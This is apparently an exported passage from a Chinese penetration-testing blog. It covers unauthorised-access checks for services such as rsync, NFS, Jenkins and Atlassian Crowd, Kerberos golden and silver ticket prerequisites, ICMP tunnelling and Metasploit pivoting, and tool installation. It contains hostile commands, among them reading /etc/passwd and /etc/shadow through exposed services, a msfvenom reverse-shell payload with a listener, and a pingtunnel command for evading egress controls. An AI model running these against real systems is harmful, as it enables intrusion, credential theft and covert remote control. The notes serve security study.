<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
<h3 id="9-hadoop未授权访问"><a href="#9-hadoop未授权访问" class="headerlink" title="9.hadoop未授权访问"></a>9.hadoop未授权访问</h3><blockquote>
<p>默认端口8088</p>
</blockquote>
<p>漏洞验证</p>
<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
<h3 id="10-jenkins未授权访问"><a href="#10-jenkins未授权访问" class="headerlink" title="10.jenkins未授权访问"></a>10.jenkins未授权访问</h3><blockquote>
<p>默认端口8080</p>
</blockquote>
<p>检测方法</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
<p>然后直接访问：<a href="http://192.168.18.129:8080/manage">http://192.168.18.129:8080/manage</a></p>
<h3 id="11-activeMQ未授权访问"><a href="#11-activeMQ未授权访问" class="headerlink" title="11.activeMQ未授权访问"></a>11.activeMQ未授权访问</h3><blockquote>
<p>默认端口8161</p>
</blockquote>
<p>漏洞验证</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
<p>ActiveMQ默认使用8161端口，默认用户名和密码是admin&#x2F;admin</p>
<h3 id="12-rabbitMQ未授权访问漏洞"><a href="#12-rabbitMQ未授权访问漏洞" class="headerlink" title="12.rabbitMQ未授权访问漏洞"></a>12.rabbitMQ未授权访问漏洞</h3><p>漏洞验证</p>
<p><a href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p>
<p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672/</a></p>
<p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692/</a></p>
<p>默认账号密码都是guest</p>
<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><blockquote>
<p>扫描工具：<a href="https://github.com/F6JO/RouteVulScan">https://github.com/F6JO/RouteVulScan</a></p>
<p>解压工具：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
<p>扫描ak&#x2F;sk泄露文件  heapdump</p>
</blockquote>
<p>漏洞特征，图标(绿叶子)和报错页面</p>
<p>漏洞验证</p>
<p>直接访问相关路径：</p>
<p><a href="http://10.2.20.48/autoconfig">http://10.2.20.48:/autoconfig</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.png" alt="1625021874(1)"></p>
<p>Spring Boot Actuator从未授权访问到getshell</p>
<p><a href="https://blog.csdn.net/qq_38154820/article/details/106330264">https://blog.csdn.net/qq_38154820/article/details/106330264</a></p>
<h3 id="14-FTP未授权访问漏洞（匿名登录）"><a href="#14-FTP未授权访问漏洞（匿名登录）" class="headerlink" title="14.FTP未授权访问漏洞（匿名登录）"></a>14.FTP未授权访问漏洞（匿名登录）</h3><p>漏洞验证</p>
<p>直接访问ftp路径：<a href="ftp://ip:port/">ftp://ip:port/</a></p>
<h3 id="15。jboss未授权访问"><a href="#15。jboss未授权访问" class="headerlink" title="15。jboss未授权访问"></a>15。jboss未授权访问</h3><p>漏洞特征：8080端口访问后左上角有jboss logo</p>
<p>漏洞验证</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 <a href="http://ip:jboss端口/">http://ip:jboss端口/</a> 看是否能进入 jmx-console 和 web-console 。</p>
<h3 id="16-ldap未授权访问"><a href="#16-ldap未授权访问" class="headerlink" title="16.ldap未授权访问"></a>16.ldap未授权访问</h3><p>漏洞特征：phpldapadmin</p>
<p><a href="https://www.cnblogs.com/Zh1z3ven/p/13894171.html">https://www.cnblogs.com/Zh1z3ven/p/13894171.html</a></p>
<p>漏洞验证</p>
<p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
<h3 id="17-rsync未授权访问"><a href="#17-rsync未授权访问" class="headerlink" title="17.rsync未授权访问"></a>17.rsync未授权访问</h3><p>默认端口873</p>
<p>漏洞验证：</p>
<p>#rsync rsync:&#x2F;&#x2F;{target_ip}&#x2F;</p>
<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;</p>
<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src</p>
<p>利用rsync下载任意文件</p>
<p>rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p>
<h3 id="18：vnc未授权访问漏洞"><a href="#18：vnc未授权访问漏洞" class="headerlink" title="18：vnc未授权访问漏洞"></a>18：vnc未授权访问漏洞</h3><p>默认端口5900，5901</p>
<p>漏洞验证</p>
<p>vncviewer 192.168.15.8</p>
<h3 id="19-dubbo未授权访问"><a href="#19-dubbo未授权访问" class="headerlink" title="19.dubbo未授权访问"></a>19.dubbo未授权访问</h3><p>无明显特征</p>
<p>漏洞验证</p>
<p>telnet ip port</p>
<p>链接进入dubbo服务， 进行操作</p>
<h3 id="20-nfs共享目录未授权访问"><a href="#20-nfs共享目录未授权访问" class="headerlink" title="20.nfs共享目录未授权访问"></a>20.nfs共享目录未授权访问</h3><p>默认端口2049,20048</p>
<p>漏洞验证</p>
<p>apt install nfs-common 安装nfs客户端</p>
<p>showmount -e 192.168.70.162 查看nfs服务器上的共享目录</p>
<p>mount -t nfs 192.168.70.162:&#x2F;grdata &#x2F;mnt 挂载到本地</p>
<h3 id="21-druid未授权访问"><a href="#21-druid未授权访问" class="headerlink" title="21.druid未授权访问"></a>21.druid未授权访问</h3><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.jpg" alt="img"></p>
<p>漏洞描述</p>
<p>当开发者配置不当时就可能造成未授权访问下面给出常见Druid未授权访问路径</p>
<p>&#x2F;druid&#x2F;websession.html</p>
<p>&#x2F;system&#x2F;druid&#x2F;websession.html </p>
<p>&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;websession.html(jeecg)</p>
<p>漏洞验证</p>
<p>访问相关的路径：<a href="http://10.20.37.152:7001/BSCC/druid/index.html">http://10.20.37.152:7001/BSCC/druid/index.html</a></p>
<h3 id="22-couchdb未授权访问漏洞"><a href="#22-couchdb未授权访问漏洞" class="headerlink" title="22.couchdb未授权访问漏洞"></a>22.couchdb未授权访问漏洞</h3><p>默认端口：5984</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务：</p>
<p>curl <a href="http://192.168.18.129:5984/">http://192.168.18.129:5984</a></p>
<p>curl <a href="http://192.168.18.129:5984/_config">http://192.168.18.129:5984/_config</a></p>
<h3 id="23-atlassian-crowd未授权访问"><a href="#23-atlassian-crowd未授权访问" class="headerlink" title="23.atlassian crowd未授权访问"></a>23.atlassian crowd未授权访问</h3><p>漏洞特征：左上角atlassian的logo端口，默认端口8095</p>
<p>漏洞验证</p>
<p>进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</p>
<p>curl –form “file_cdl&#x3D;@applinks-plugin-5.4.12.jar” <a href="http://192.168.18.138:8095/crowd/admin/uploadplugin.action">http://192.168.18.138:8095/crowd/admin/uploadplugin.action</a> -v</p>
<p>访问地址并执行命令：<a href="http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p>
<h3 id="24-jupyternotebook未授权访问"><a href="#24-jupyternotebook未授权访问" class="headerlink" title="24.jupyternotebook未授权访问"></a>24.jupyternotebook未授权访问</h3><p>漏洞特征：左上角有logo，jupyter</p>
<p>漏洞验证</p>
<p>利用nmap 扫描端口，获取到服务，访问地址：<a href="http://192.168.18.129:8888/">http://192.168.18.129:8888</a></p>
<p>利用terminal命令执行：New &gt; Terminal 创建控制台</p>
<p>可以执行任意命令</p>
<h3 id="25-windows-ipc-共享未授权访问"><a href="#25-windows-ipc-共享未授权访问" class="headerlink" title="25,windows ipc 共享未授权访问"></a>25,windows ipc 共享未授权访问</h3><p>工具扫描，远程验证</p>
<h3 id="26-rtsp未授权访问"><a href="#26-rtsp未授权访问" class="headerlink" title="26.rtsp未授权访问"></a>26.rtsp未授权访问</h3>]]></content>
  </entry>
  <entry>
    <title>Proxifier</title>
    <url>/2023/07/11/Proxifier/</url>
    <content><![CDATA[<p><a href="https://blog.zgsec.cn/index.php/archives/278/">https://blog.zgsec.cn/index.php/archives/278/</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img2412617656.png" alt="玩转代理-1.png"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230711204019502.png" alt="image-20230711204019502"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230711204007698.png" alt="image-20230711204007698"></p>
<p>代理规则中要新增一个代理规则，</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230711204508203.png" alt="image-20230711204508203"></p>
<p>直接连接，不走代理，这个放在第一位，有些进程在本地通讯中会用到这个玩意，必须先让它直连，如果它走代理的话对应的进程会出问题的，然后如果要配置java程序走代理</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230807143107301.png" alt="image-20230807143107301"></p>
<p>这样就好了</p>
]]></content>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>内网kerberos协议</title>
    <url>/2023/06/21/%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<h4 id="CS-DNS隧道上线"><a href="#CS-DNS隧道上线" class="headerlink" title="CS DNS隧道上线"></a>CS DNS隧道上线</h4><p><a href="https://whale3070.github.io/2021/02/05/11-x/#%E5%9F%BA%E7%A1%80">https://whale3070.github.io/2021/02/05/11-x/#%E5%9F%BA%E7%A1%80</a></p>
<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><h5 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h5><p>自己登陆自己电脑</p>
<h5 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h5><p>两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
<h5 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h5><blockquote>
<p>域环境中的认证方式</p>
<p><a href="https://blog.csdn.net/zzq060143/article/details/120531735">https://blog.csdn.net/zzq060143/article/details/120531735</a></p>
<p><a href="https://www.freebuf.com/articles/network/371446.html">https://www.freebuf.com/articles/network/371446.html</a></p>
</blockquote>
<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h6><p>密钥分发中心KDC(Key Distribution Center ) ，密钥分发中心一般又分为两部分，分别是</p>
<p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
<p>​		TGS(Ticket Granting Server): 票据授予服务器，用来发放整个认证过程以及客户端访问服务端是所系的服务授予票据(Ticket)</p>
<h6 id="三次通信验证机制"><a href="#三次通信验证机制" class="headerlink" title="三次通信验证机制"></a>三次通信验证机制</h6><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230702024819915.png" alt="image-20230702024819915"></p>
<p>第一次：客户端请求AS，传递自己的信息给AS</p>
<p>AS收到请求后，去数据库验证你是否存在，不验证对错，如果存在，AS产生随机的session key，这个key将用于你和TGS的通信</p>
<p>AS会发送两部分信息给你，一部分是TGT，通过KDC自己的密码加密，另一部分通过你的密码加密，如果你的密码是正确的，你可以解密第二部分信息，获取到TGS session key ,如果密码不正确，无法解密，则认证失败，第一部分是TGT你是无法解密的，需要暂时缓存起来。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 1</span></span><br><span class="line">name</span><br><span class="line">ip</span><br><span class="line">TGT的有效时间</span><br><span class="line"><span class="comment">#回送信息 2</span></span><br><span class="line">name     KDC 自己的密码加密</span><br><span class="line">ip</span><br><span class="line">TGS name</span><br><span class="line">TGT 生命周期</span><br><span class="line">时间戳</span><br><span class="line">TGS session key</span><br><span class="line"></span><br><span class="line">TGS name   你的密码加密</span><br><span class="line">时间戳</span><br><span class="line">生命周期</span><br><span class="line">TGS session key</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>第二次：如果第一部分你已经成功，那你已经获得无法解密的TGT和TGS session key  ，请求TGS，</p>
<p>TGS收到信息后，检查数据库中是否包含你请求的http服务名，如果存在，则通过KDC的密码解密TGT，这时，我们就能获取到TGS session key 然后通过TGS session key去解密你传输的第一部分认证器，获取到你的用户名和时间戳，此时TGS在进行验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比TGT中的用户名与认证器中的用户</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在TGS缓存中(避免应答攻击)</span><br><span class="line">6.可以在这部分添加权限认证服务</span><br></pre></td></tr></table></figure>

<p>TGS随机产生一个HTTP service session key ，同时准备http service ticket(ST)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 3</span></span><br><span class="line">name    TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">请求的服务名</span><br><span class="line">http service 的ticket的生存周期    明文传输</span><br><span class="line"><span class="comment"># 回送信息 4   </span></span><br><span class="line">name      通过http服务的密码加密(ST)</span><br><span class="line">IP</span><br><span class="line">时间戳</span><br><span class="line">http服务name</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br><span class="line"></span><br><span class="line">http服务的name   通过TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br></pre></td></tr></table></figure>

<p>你收到信息后，通过TGS session key 解密，获取了HTTP session key,但是你无法解密ST</p>
<p>第三次：前面两步成功后，以后每次获取http服务，在ticket没有过期，或者无更新的情况下，都可以直接进行这一步，省略前面的两个步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 请求信息</span><br><span class="line">name    http service session key加密</span><br><span class="line">时间戳</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>服务端收到后，通过自己的密码解压ST(KDC是http服务的密码加密的)，这样就能够获取到http servicesession key 解密好之后，进行检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比ST中的用户名，与认证器中的用户名</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在HTTP服务的缓冲中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回答信息</span><br><span class="line">http服务name</span><br><span class="line">时间戳</span><br></pre></td></tr></table></figure>

<p>你通过缓存的http service session key 解密这部分信息，然后验证是否是你想要的服务器发给你的信息，完成验证</p>
<p>黄金票据: 直接跳过AS ，伪造tgt获得st</p>
<p>伪造条件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称  (shell net config workstation)</span><br><span class="line">2.域的SID值(shell whoami /user)</span><br><span class="line">3.域的KRBTGT账号的hash(lsadump::dcsync /domain:tset.cocm /all /csv)</span><br><span class="line">4.伪造任意用户名(随便写)</span><br></pre></td></tr></table></figure>

<p>白银票据: 直接伪造ST，更加隐蔽和难以检测</p>
<p>白银票据伪造条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM hash</span><br><span class="line">6.需要伪造的用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="委派攻击、"><a href="#委派攻击、" class="headerlink" title="委派攻击、"></a>委派攻击、</h5><blockquote>
<p>在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的。 </p>
</blockquote>
<p>约束性委派</p>
<p>非约束性委派</p>
<p>基于资源的约束性委派</p>
<p><a href="https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><p>今天在学习内网的时候上传后门后遇到了TCP协议不出网的问题</p>
<p>解决方法是利用pingtunnel脚本将TCP流量转换成ICMP 流量从而实现MSF上线</p>
<p>把TCP协议数据封装成ICMP协议数据 隧道技术</p>
<p><strong>具体流程：</strong></p>
<p>**1.**生成后门:<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1 LPORT&#x3D;3333 -f exe &gt; xd.exe</p>
<p>**2.**MSF启动监听:<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>set lhost 0.0.0.0</p>
<p>set Ipont 4444</p>
<p>exploit</p>
<p>**3.**Kali开启隧道:<br>.&#x2F;pingtunnel -type server</p>
<p>**4.**Win开启隧道&#x2F;&#x2F;将本地3333icmp协议数据转发至66ip的4444流量上(管理员运行)</p>
<p>pingtunnel.exe -type client -l 127.0.0.1:3333 -5 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1</p>
<p>这样做的目的是通过pingtunnel利用隧道把TCP流量转换成ICMP流量</p>
<p>1、pingtunnle 客户端先将tcp转为了icmp （这一步就已经完成了出网）<br>2、pingtunnle 服务端将icmp转为tcp<br>3、pingtunnle 服务端紧接着转发到msf4444端口</p>
<p>这是很简单得出网底层逻辑，这个逻辑可以套用在任何出网技巧</p>
<h4 id="msf生成代理"><a href="#msf生成代理" class="headerlink" title="msf生成代理"></a>msf生成代理</h4><h5 id="第一步、使用MSF生成socks代理"><a href="#第一步、使用MSF生成socks代理" class="headerlink" title="第一步、使用MSF生成socks代理"></a>第一步、使用MSF生成socks代理</h5><p>攻击者使用的MSF开启代理：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>默认就会在1080端口开放socks4代理</p>
<h5 id="第二步、更改ProxyChains配置文件"><a href="#第二步、更改ProxyChains配置文件" class="headerlink" title="第二步、更改ProxyChains配置文件"></a>第二步、更改ProxyChains配置文件</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br><span class="line">socks4 <span class="number">192.168</span><span class="number">.0</span><span class="number">.66</span> <span class="number">1080</span>  <span class="comment">//新增一行</span></span><br></pre></td></tr></table></figure>

<h5 id="第三步、利用外层Web服务器的meterpreter，添加静态路由"><a href="#第三步、利用外层Web服务器的meterpreter，添加静态路由" class="headerlink" title="第三步、利用外层Web服务器的meterpreter，添加静态路由"></a>第三步、利用外层Web服务器的meterpreter，添加静态路由</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sessions <span class="number">1</span>  <span class="comment">//根据自己的实际情况进入session</span></span><br><span class="line">run autoroute -s <span class="number">10.10</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span>  <span class="comment">//绑定内网网段</span></span><br><span class="line">run autoroute -p  <span class="comment">//查看是否绑定成功</span></span><br></pre></td></tr></table></figure>

<h5 id="第四步、使用代理进行攻击"><a href="#第四步、使用代理进行攻击" class="headerlink" title="第四步、使用代理进行攻击"></a>第四步、使用代理进行攻击</h5><p>这里以Nmap举例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn <span class="number">10.10</span><span class="number">.1</span><span class="number">.12</span> -p <span class="number">80</span>  <span class="comment">//扫描10.10.1.12的80端口</span></span><br></pre></td></tr></table></figure>

<p>使用火狐打开内网OA页面：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proxychains3 firefox http:<span class="comment">//10.10.1.12</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>各种软件的安装</title>
    <url>/2023/07/14/%E5%AE%89%E8%A3%85%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="unzip安装"><a href="#unzip安装" class="headerlink" title="unzip安装"></a>unzip安装</h3><p>sudo wget <a href="http://downloads.sourceforge.net/infozip/unzip552.tar.gz">http://downloads.sourceforge.net/infozip/unzip552.tar.gz</a></p>
<p>tar -zxvf unzip552.tar.gz</p>
<p>cd unzip-5.52&#x2F;</p>
<p>cp unix&#x2F;Makefile .&#x2F;</p>
<p>make generic</p>
<p>sudo make install</p>
<h3 id="NETCAT安装"><a href="#NETCAT安装" class="headerlink" title="NETCAT安装"></a>NETCAT安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install nc</span><br><span class="line">apt-get install netcat</span><br><span class="line"></span><br><span class="line">    -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">    -G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</span><br><span class="line">    -h 在线帮助。</span><br><span class="line">    -i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span><br><span class="line">    -l 使用监听模式，管控传入的资料。</span><br><span class="line">    -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">    -o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span><br><span class="line">    -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">    -r 乱数指定本地与远端主机的通信端口。</span><br><span class="line">    -s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</span><br><span class="line">    -u 使用UDP传输协议。</span><br><span class="line">    -v 显示指令执行过程。</span><br><span class="line">    -w&lt;超时秒数&gt; 设置等待连线的时间。</span><br><span class="line">    -z 使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>

<h3 id="redis可视化管理工具"><a href="#redis可视化管理工具" class="headerlink" title="redis可视化管理工具"></a>redis可视化管理工具</h3><p><a href="https://github.com/qishibo/AnotherRedisDesktopManager/releases">https://github.com/qishibo/AnotherRedisDesktopManager/releases</a></p>
<h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><h4 id="1-2-安装docker"><a href="#1-2-安装docker" class="headerlink" title="1.2.安装docker"></a>1.2.安装docker</h4><p>安装yum工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils \</span><br><span class="line">           device-mapper-persistent-data \</span><br><span class="line">           lvm2 --skip-broken</span><br></pre></td></tr></table></figure>

<p>然后更新本地镜像源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置docker镜像源</span></span><br><span class="line">yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/download.docker.com/mirrors.aliyun.com\/docker-ce/g&#x27;</span> /etc/yum.repos.d/docker-ce.repo</span><br><span class="line"></span><br><span class="line">yum makecache fast</span><br></pre></td></tr></table></figure>

<p>然后输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce</span><br></pre></td></tr></table></figure>

<p>docker-ce为社区免费版本。稍等片刻，docker即可安装成功。</p>
<h4 id="1-3-启动docker"><a href="#1-3-启动docker" class="headerlink" title="1.3.启动docker"></a>1.3.启动docker</h4><p>Docker应用需要用到各种端口，逐一去修改防火墙设置。非常麻烦，因此建议大家直接关闭防火墙！</p>
<p>启动docker前，一定要关闭防火墙后！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"><span class="comment"># 禁止开机启动防火墙</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#查看是否关闭防火墙</span></span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>

<p>通过命令启动docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker  <span class="comment"># 启动docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl stop docker  <span class="comment"># 停止docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl restart docker  <span class="comment"># 重启docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl status docker    <span class="comment">#查看docker是否启动</span></span><br></pre></td></tr></table></figure>

<p>当出现active（running）时，即为启动成功</p>
<h4 id="1-4-配置镜像加速"><a href="#1-4-配置镜像加速" class="headerlink" title="1.4.配置镜像加速"></a>1.4.配置镜像加速</h4><p>docker官方镜像仓库网速较差，我们需要设置国内镜像服务：</p>
<p>参考阿里云的镜像加速文档：<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##创建文件夹</span><br><span class="line">sudo mkdir -p /etc/docker</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##在文件夹内新建一个daemon.json文件</span></span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://akchsmlh.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment">##在文件夹内新建一个daemon.json文件</span></span><br><span class="line"><span class="built_in">touch</span> daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment">##重新加载文件</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment">##重启docker</span></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>



<p>到此Docker的安装就基本结束了</p>
<h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><p> 启动环境   docker-compose up -d</p>
<p>关闭环境    docker-compose down</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>

<h3 id="burpsuite插件"><a href="#burpsuite插件" class="headerlink" title="burpsuite插件"></a>burpsuite插件</h3><h4 id="jsEncrypter"><a href="#jsEncrypter" class="headerlink" title="jsEncrypter"></a>jsEncrypter</h4><blockquote>
<p>前端加密爆破</p>
<p><a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p>
</blockquote>
<p>1.下载 phantomjs      </p>
<p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p>
<p>2.网站找到js加密方法 下载到phantomjs&#x2F;bin文件夹，模板文件也放到目录下</p>
<p>3.修改模板文件的引入函数</p>
<p>4.phantomjs.exe nodejs_server_md5.js</p>
<p>5.bp插件点连接</p>
<h3 id="msf安装"><a href="#msf安装" class="headerlink" title="msf安装"></a>msf安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sudo apt update</span><br><span class="line">2. sudo apt install curl gpg ruby -y</span><br><span class="line">3. curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall</span><br><span class="line">4. sudo ./msfinstall</span><br><span class="line">5. sudo msfdb init</span><br><span class="line">6. msfconsole</span><br></pre></td></tr></table></figure>



<h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p>华为云镜像<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">https://repo.huaweicloud.com/java/jdk/8u151-b12/</a></p>
